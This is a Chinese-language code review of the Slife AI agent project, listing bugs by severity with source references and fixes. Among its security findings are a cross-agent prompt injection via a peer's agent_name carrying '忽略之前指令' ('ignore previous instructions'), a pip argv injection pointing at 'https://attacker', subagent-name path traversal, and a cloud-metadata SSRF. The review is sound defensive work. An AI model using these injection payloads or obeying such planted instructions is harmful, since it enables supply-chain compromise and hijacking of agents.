# Slife Code Review

**日期:** 2026-08-16 · **基线:** 1976 tests pass（本机全绿，本地运行确认）· **范围:** 全新全库评审，8 个并行子系统（memdb / agent core / tools / a2a / mcp / ui / subagent+plugins / core-infra），高危项已逐条复核到源码（标注 ✓）。

> 这是旧 `REVIEW.md`（2026-08-13）删除后的全新评审。上一轮已修复的项（memdb 连接泄漏、20% 硬上限、count_turns 括号、FTS5 UPDATE 触发器、gguf 阻塞、restore 图片、M5–M7 搜索加固等）已复核为关闭。以下为**当前仍存在的问题**，按严重度排序。

---

## 1. 高危（功能不可用 / 静默丢数据 / 安全）

> ✅ 本节 4 项已全部修复（2026-08-16）。

- **✅ MCP OAuth 设备码轮询用已关闭的 httpx client → OAuth 受保护服务器永远无法授权** — `mcp/oauth.py:199-211,263-276`：`async with httpx.AsyncClient(...)` 在设备码 POST 后就 close，轮询循环仍 `http.post(token_url)` → 抛 `RuntimeError`（非 `httpx.HTTPError`，`except … continue` 抓不住）→ 逃出 `run_device_code_flow`。`connection.py:186-187` 里 `_ensure_oauth_token` 在 `connect()` 的 `try` 之前，`_status` 卡死在 `CONNECTING`，健康监控永不启动，服务器必须移除重加。→ 轮询改用本函数自有的新 client（`_poll_token`），`finally` 关闭；补回归测试（`test_poll_runs_on_fresh_client_after_device_post`）。
- **✅ 配置文件损坏 + 任意写配置入口 → 整份 slife.json5 被静默清空** — 两条独立路径同根：① `tools/_config_io.py:58-67` `read_config` 吞掉 `(ValueError, OSError)` 返回 `{}`；`config_env_set/native_tool_set/model_set/skill_set_enabled` 直接 `write_config(path, {})`（原子 `os.replace` 覆盖）。② `config.py:448-460,502,596` `save_mcp_server/save_rest_api/save_cli_tool` 同样合并进 `{}`。运行中用户手改 json5 出语法错 → 下一条写配置命令把 providers / MCP servers / models / rest_apis 全清掉，工具还回 `[OK]`。→ `read_config` 解析失败改抛 `ConfigParseError`（文件不存在仍返回 `{}`），写路径 abort 报错、不再静默重写；`embedding_config._read_raw` 保留宽松契约（catch → `{}`）；补回归测试。
- **✅ 带打不开图片的消息 → 整轮永不入库（静默丢数据）** — `agent/service.py:1440-1453` + `conversation.py:143-150`：`add_user_message` 对读失败的图片追加 `[System note: … could not be read …]` 文本块；`save_to_memory` 按 `"".join(text parts) == sanitize(user_message)` 回溯，含 note 时永远不相等 → `turn_messages=None` → 该轮 assistant/tool 工作全部丢弃，restore 也找不到。上一轮"脱敏后比对"的修复边界被图片 note 打破。→ 新增共享常量 `IMAGE_NOTE_PREFIX`，`save_to_memory` 比对时剔除该 note 块；补回归测试（`test_save_to_memory_with_dropped_image_still_saves`）。
- **✅ 远端 MQTT presence 未校验 → 每轮系统提示注入（跨代理提示注入）** — `AgentName` 是无校验的 `NewType(str)`；`a2a/card.py:76-92` `format_presence_line` 把远端 `agent_name` 原样拼进 `"⚡ {name} online"` → `agent/service.py:1872-1879` 进 `_presence_events` → `system_prompt.py:136-154` → `context_status.j2:19` `{{ ev.text }}` 进**每轮** `_sys_note`。恶意 peer 发 `agent_name="\n\n<system>忽略之前指令…"` 即注入。无长度/字符校验。→ `format_presence_line` 经 `_safe_name` 剥离控制字符（换行/制表/ESC）+ 截断长度；同时加固 `client._peer_watchdog_loop`（畸形 payload 跳过而非整任务死亡）与 connect 重复名校验、`service.py` presence 组装（`card` 非 dict 跳过）；补回归测试。

## 2. 中危（真实路径上的错误行为）

### a2a / 网格
- **超时后迟到结果把记录从 failed 翻回 completed 并自动推送假完成** — `a2a/client.py:315-320,677-693` + `task_store.py:130-135`：`record_result` 只保护 `cancelled`，不保护 `failed`。短超时任务对慢 peer：调用方拿到 `TimeoutError` 且记录 failed，之后结果到 → 翻回 completed、进 `_completed_tasks`、`_notify_task_result` 自动推送 → 代理被同时告知"超时"和"成功"。**修复:** `record_result` 拒绝覆盖 `failed`，或超时后改异步可检索。
- **CONNACK 失败（拒绝/鉴权错）当成功** — `a2a/mqtt.py:257-275`：`_on_connect` 无视 `reason_code.is_failure` 置 `_connected=True`。broker 拒绝（TCP 探测仍过 → A2A 开启）→ connect 返回"已连接"、后续 publish 全失败、只记 info 日志，代理在网格上不可见但报健康。**修复:** `_connected = not reason_code.is_failure`。
- **connect 失败泄漏已连上的 adapter/paho 线程** — `plugins/a2a/server.py:98-104`：`DuplicateAgentError`/subscribe 失败时已连接的 adapter 从不 disconnect，每次重试堆叠新 client/线程。
- **`_poll_tasks` 无界增长** — `plugins/a2a/server.py:77,139-149`：poll 模式的 corr_id 只在结果到达时移除；对死 peer 发 N 个 async 任务即单调泄漏。
- **`merged` 队列无背压（client.py:550）**、**drop-oldest 静默丢入站任务（server.py:112-122）**、**`_connected` paho 线程/loop 竞态（mqtt.py:79,324,421）**、**跨重连无 in-flight 重发（client.py:466-475）** — 见第 4 节。

### memdb
- **semantic drainer 任务静默死亡** — `semantic.py:247`：`_process_batch()` 不包 try/except；`messages` 是坏 JSON 时 `store.py:849` `json.loads` 抛 ValueError → 任务死、`_enabled` 仍 True、门锁死。
- **空白 turn 永远跳过 → 索引永久卡死** — `semantic.py:288-294`：`if not embed_text.strip(): continue` 不写 chunk，`count_unembedded()` 恒 >0，20 批 no-progress 后 drainer 永久放弃（`_enabled=False`），语义门锁死到手动重开。空 user_message / 只有 user role 的 turn 触发。
- **`count_turns` fts5 分支不做 CJK 路由 → count 与 search 结果不一致** — `store.py:400-401`：`search_keyword` 对 CJK 走 `_search_like`，`count_turns(mode=fts5)` 恒走 `_to_fts5_query` MATCH → `memory_count("今天天气…")=0` 而 `memory_search` 有命中。sibling-fix 缺口。
- **`load()` 在 cancel 时孤儿化 → 之后所有 enable()/load() 永久挂起** — `embeddings.py:426-443`：CancelledError（BaseException）逃出 `except Exception`，`_loading` future 永不解锁 → 后续 `load()` 卡死且占着 `_enable_lock`。
- **`replace_embedding_chunks` 原子性在共享连接并发提交下不成立** — `store.py:772-808`：`_write_lock` 只串行化 drainer；`save_turn` 的 `commit()` 可落在 DELETE 与 INSERT 之间，把替换劈成两个事务。

### agent 核心
- **`_async` 后台工具在 `ctx.conversation` 恢复后执行 → 打到错误会话** — `loop.py:811-812,901-905`：`schedule_async` 的任务在 `_execute_tools` finally 恢复 `ctx.conversation` 之后才跑；WeChat/远端回合里 `include_image(_async=true)` 注入到 human 会话。
- **`count_tokens` 低估多模态消息** — `conversation.py:362-374`：list content 用 `len(content)`（部件数≈1-3）而非字符数；`images` 键在 `to_openai_messages` 已 pop，估计分支永不触发 → 图片重上下文几乎不算 token，trim 门/`extract_oldest_turns` 严重低估。
- **模型切换后 WeChat 持久会话仍用旧系统提示；`_last_usage` 未清** — `service.py:299-338`：`reload_active_model` 只重写 human 会话 `messages[0]`；`_convs[WECHAT]` 保留旧 model/vision/窗口%；切模型后状态栏/trim 门按旧窗口报 restore 期估值。
- **工具参数 JSON 损坏静默变 `{}`** — `loop.py:383-399`：`_build_tool_calls_from_deltas` 吞 `JSONDecodeError`，`max_tokens` 截断半截 JSON 时 `execute_shell(command=…)` 变 `execute_shell()` 空参执行，无任何告警。
- **回滚 turn 重复保存上一条相同 turn** — `service.py:1436-1452` + `inbox.py:286-292`：内容过滤 400 后 `pop_last_turn()` + finally 仍 `save_to_memory`；后向匹配命中**上一条**文本相同的 user 消息（心跳内容恒定）→ 把旧轮 messages 另存为重复 diary 行，token_count 双计。
- **空 assistant content 仍持久化并重发（OpenAI 后端 400）** — `loop.py:1047-1050`：reasoning-only/max_tokens 截断 → `add_assistant_message("")`，下轮 `_oa_msgs_to_anthropic` 对 OpenAI 格式发出空 content 被拒。Anthropic 端已补空 text block，OpenAI 端没有。

### UI
- **`_tool_widgets.clear()` 孤儿化并发流式消息的进行中工具行** — `app.py:747`：每条新消息入队时清空共享 dict，前一条还在流式的 `on_tool_result` 找不到 widget → 工具行永远"◌ running"、结果静默丢弃。
- **model picker 与审批框焦点互抢 → 泄漏任务、Ctrl+S 永久失效** — `app.py:426-470` + `handler.py:187-204`：picker 打开时审批框 `prompt.focus()` 抢焦点 → picker future 永不 resolve、`_model_picker_open` 卡 True；反向 Ctrl+S 抢审批焦点 → Esc 取消的是 picker 不是审批。重入守卫只防连按 Ctrl+S，不防对向。
- **✓ `image_utils.py:69` 文件名经 `Content.from_markup`** — `_fallback_widget` 把 `path.name` 拼进 markup，`[` 触发 `MarkupError` → 该轮静默死亡（inbox 兜底 except 吞掉）。旧评审遗留未修，文件名应走 `from_text(markup=False)`。
- **多条用户图片在同一 compositor pass 挂载 → 只画最后一张** — `chat.py:141-147` + `restore.py:496-538`：工具图片走 `_schedule_image_mounts` 错峰，用户图片（含 restore）绕过，前 N-1 张留空白。
- **审批框可无限阻塞 loop；Esc 取消不清 pending 审批** — `handler.py:187-204` + `loop.py:784-786`：`on_tool_approval` 无 `_cancel_event` 检查，失去焦点后整轮挂死、后续消息排队；Esc 只设 cancel 标志，loop 仍 await future。建议取消时 resolve(deny)。

### tools / 配置
- **✓ `config_env_set` 把字面 `${VAR}` 写进 `os.environ`** — `tools/config.py:108`：`value="${DEEPSEEK_API_KEY}"` 时 runtime env 拿到模板串，API 客户端本会话即失效，"立即生效"承诺对推荐 secret 路径失效（重启才行）。应解析后写 env、落盘保留 ref。
- **✓ `install_python_package` 无 `--` 守卫的 argv 注入** — `tools/exec.py:296-297`：`create_subprocess_exec("uv","pip","install","--python",sys.executable,*packages)`；`packages=["--index-url","https://attacker","requests"]` 被当 uv 旗标 → 供应链重定向进 slife 解释器。
- **sanitize 覆盖缺口：Basic auth / `github_pat_` / `Authorization: Token`** — `logfmt.py:301` 头模式只匹配 `(Authorization|Bearer)\s+token`；`Authorization: Basic …`、`Authorization: Token …`、`github_pat_…`（`\bgh[psu]_` 不匹配）全放行。
- **sanitize 误伤合法内容** — `logfmt.py:317` `_URL_CREDENTIAL_PATTERN` 的 `[^@\s]+` 含 `/`（`https://host:8080/user@domain` → 吞 `8080/user`）；`[^\s]{6,}` 含引号/括号（JSON `{"api_key": "sk-…"}` 吞到 `"}`）。真实 stderr/log 文本被破坏。
- **config env 值未经 sanitize 直接进日志** — `__init__.py:90-97`：`DATABASE_URL: postgres://…` / `MONGO_URI` / `REDIS_URL`（键名不含 SECRET/TOKEN 子串）DEBUG 全量落盘，连接串凭据外泄；脱敏键也暴露首尾 4 字符。
- **`${VAR:-default}` 绕过 credstore 回退** — `config.py:57-66` + `env.py:23-35`：`resolve_env` 先于 `_resolve_secret`，缺 env 时先填字面默认 → credstore 持有的 key 永远走不到。"shell > credstore > literal" 文档序被 `:-default` 形式破坏（provider/model/MCP 同路径）。
- **文档宣称的 `python -m slife myconf.json5` 自定义配置路径被忽略** — `__main__.py:13-21` + `__init__.py:25-44`：不读位置参数，相对路径也丢弃 → 静默加载默认配置、无报错。
- **POSIX 下播种的配置文件 0644 世界可读** — `config.py:831` `shutil.copy` 保留包模板 mode，后续 `write_config` 也保留宽松权限；明文 API key 落盘后本机任意账户可读。

### subagent / wechat / memfiles
- **✓ `subagent_name` 无字符校验 → 身份注入 + 日志文件名路径穿越** — `subagent/process.py:124,502-504`：名进 `SLIFE_SUBAGENT_NAME` → `subagent.j2` "You are {{ name }}"（注入子代理身份行）；又经 headless 进 `server_utils.py:150` `f"{ts}_{agent}_subagent_{name}.log"`，`..\..\evil` 穿出日志目录。应白名单 `[A-Za-z0-9_-]` + 长度上限。
- **超时同步任务的迟到结果被丢弃，与"结果自动送达"承诺矛盾** — `subagent/process.py:227` + `tools/subagent.py:273`：`send_task` 超时把 rpc_id 加 `_cancelled` 并抛 TimeoutError；`_dispatch_message` 对 cancelled id 直接丢弃迟到响应。工具文案说会送达、实际丢。
- **reader EOF 未扣 `_inflight` → worker 永久 busy** — `subagent/process.py:377-383`：`_read_stdout` finally 给 pending futures 置异常但不减 `_inflight`；child 死后 `is_busy` 恒 True，后续任务全部转 async 排队到死 worker。
- **任务超时从不杀/重启 worker；被弃任务阻塞串行队列** — `subagent/process.py:217-231`：超时后 child 继续串行处理该任务，后续任务无界堆积，无超时驱动回收。
- **wechat 去重误删跨轮真实重复消息** — `wechat/server.py:129-178`：`_seen_keys` 跨 poll 持久，`batch_seen` 只放行同 poll 内重复；用户 >3s 间隔连发"收到"第二条被当重投丢弃。
- **memfiles SSRF 守卫不复查重定向跳** — `memfiles/server.py:592-609`：只校验初始 host，`allow_redirects=True` 直取跳转目标（`http://public/r` 302 → `169.254.169.254` 元数据被取并公开共享）。文档自认，DNS-rebinding TOCTOU 亦在。
- **memfiles tunnel 掉线后仍报 active（无持续健康探测）** — `tunnel.py:244-273`：`_run_monitor` 是 2s 一次性重试；`status()` 只看 `_public_url`，ngrok 会话被端侧回收后 share URL 全 404 但 `__tunnel_status`/`expose_file` 仍报 active。

### MCP
- **`disconnect()` 不串行化在途 `connect()` → 孤儿进程 + 泄漏监控** — `plugins/mcp/connection.py:754-771` vs `167-196`：OAuth/慢连接期间 `mcp_remove`/`shutdown` 只 pop 清理，connect 恢复后照常 spawn + 起 `_health_monitor`，池里无人引用 → 永久泄漏。只修了 monitor 发起的重连路径，`call_tool` 懒重连/`mcp_set_enabled` 触发的 connect 不受保护。

## 3. 低危（边角 / 资源增长 / 展示 / 卫生）

- `_usage_by_conv` 以 `id(conversation)` 为键无界增长 + id 复用读脏（loop.py:307,475-477,692）。上一轮"无界增长仍在"原样未改；且每 60s 心跳 + 每 A2A 远端回合都新增永久条目。
- `_context_turn_dates` 无界增长；首个 trim 下溢让 `_context_time_start` 陈旧（loop.py:954-996）。
- a2a `_poll_tasks`、`_task_records`、`merged` 队列、`_stderr_buffer`、`health._entries`、subagent `_task_records/_async_results/_cancelled`、meta `_tasks`、memfiles `_inbound_tasks` 等均为无界/半无界增长。
- `display._show_url` 无字节上限整读远程 body + 图片缓存永不清理（display.py:56-103）；memfiles `url_save` 整读入内存无大小帽（server.py:604-610）。
- `exec._parse_input` 按第一个 `[`/`{` 切分，脚本路径含方括号即碎（exec.py:190-198）。
- 工具名经 `_lit` 已修；但 `tool_display` 主参数值（原始 LLM 数据，可能含密钥）常显在折叠头行（tool_display.py:45-50,223-229）。
- `mcp/client.py:61-78` 图片临时文件永不删除；`tool_adapter.py:103-116` 服务器提供的工具名/描述无转义（信任模型内 LOW）。
- `mcp/process.py:124,256-282` `_log_stderr` 任务从不 cancel/await；`connection.py:404-408` 非 SSE 探测响应不读即关（每轮重连漏一个连接）；`connection.py:167-273` connect 无端到端握手超时；`connection.py:589-591` 硬 30s SSE 超时与"无读超时"架构矛盾。
- `_seed_first_run_config` 0644；`detect_current_shell` 用 PSModulePath 推断 PowerShell 过度上报（cmd 启动的会话命令路由错）；`tools` 段严格 `resolve_env` KeyError 中止启动；`paths.is_dev()` CWD 脆弱；`bootstrap.setup_logging` 去重返回无人写的路径；config `mcp: "foo"` 非 dict 时 AttributeError；`config.to_dict` 把已解析明文 api_key 序列化进子代理 env。
- `wechat` token 恢复不校验有效性、typing keepalive 无回复时泄漏；`memdb` FTS5 snippet 取第 3 列（tags，未总结 turn 恒空）、schema 错误吞 DEBUG、`_call_api` 懒初始化无锁、`get_first_provider_api_key` 把 `${VAR}` 占位当有效 key、CJK `max_tokens*4` 字符上限高估（bge-large 2000 字符 CJK 超 token 上限再卡 drainer）。
- 测试质量：`test_ui_chat.py:18 test_basic_message_format` patch `__init__` 后空跑，无断言（同名类其余测试正常）；其余 ~44 个"无断言"测试多数为合法的 no-crash 检查。

## 4. 测试与 CI

- **基线:** 1976 tests 本地全绿（上一轮 1881）。CI 在 Ubuntu/macOS/Windows × Python 3.13 上 build wheel 后对 wheel 跑测试（wheel 确被真实执行，非旧评审的悬置项）。
- **仍未覆盖:** 无覆盖率门槛（`[tool.coverage]` 已配置但 CI 不跑 `--cov`）；无 subagent 真实子进程集成测试；无 OAuth/wechat/ngrok 真实链路集成测试；安装脚本无冒烟测试。
- **本轮新确认的"单元测试没拦住"的重灾区:** OAuth 设备码轮询用已关闭 client（HIGH）、配置读失败清空文件（HIGH）、图片 note 破坏 save_to_memory 匹配（HIGH）——都缺回归测试。

## 5. 值得保持的模式（复核未回归）

- memdb SQL 全参数化；FTS5 `diary_ai/ad/au` 触发器完整（UPDATE 存在、external-content 语法正确）；LIKE `ESCAPE '\'` 在 `search_grep`/`_search_like`/`count_turns` 三处一致（M5 修复确实到位）。
- 工具结果在 `_run_one` 全分支（含 async/denied）先 `sanitize_secrets` 再进对话与 UI；live 20% 截断与 `compact_tool_results` head/tail 数学正确。
- approval_prompt / model_picker / tool_display / chat 的 markup 处理全部走 `_lit`/`from_text(markup=False)`（UI 注入面已收口，除 image_utils 遗留）。
- MCP SSE 探测的"有响应无 endpoint 事件 → 5s 回退 Streamable"正确（C9 已修）；stdio JSON-RPC 行帧 + `_lock` 串行化安全；子进程 argv 无 shell。
- 配置写原子（temp + `os.replace` + fsync + 进程内锁 + 异常清理）；token 存 credstore（OS keyring）非明文。
- subagent 身份/连接/权限模型正确（read 线程有 EOF 守卫、超时 kill 全树、headless 共享插件双载防护）。

## 6. Repo 卫生

- `REVIEW.md` 已按本轮全新重写；README/DESIGN 中旧评审引用已全部清除。
- 源码里仍散落 ~70 处 `(REVIEW §…/C…/H…/M…)` 注释指向已删除的旧文档 —— 悬空引用，建议随改动逐步清理（未在本轮动，避免污染评审 diff）。
- `slife.db(-wal/-shm)`、`.coverage`、`credentials.crypt`、`logs/`、`Jack.db*` 均为本地未跟踪数据，保持不提交。

## 本轮最该先修的三件事

1. **OAuth 轮询已关闭 client**（第 1 节 #1）——功能不可用，一行修复级。
2. **配置读失败清空文件**（第 1 节 #2）——静默丢全部配置，两条路径同一根。
3. **带坏图片的 turn 不落库**（第 1 节 #3）——高频误触发路径上的静默丢数据。
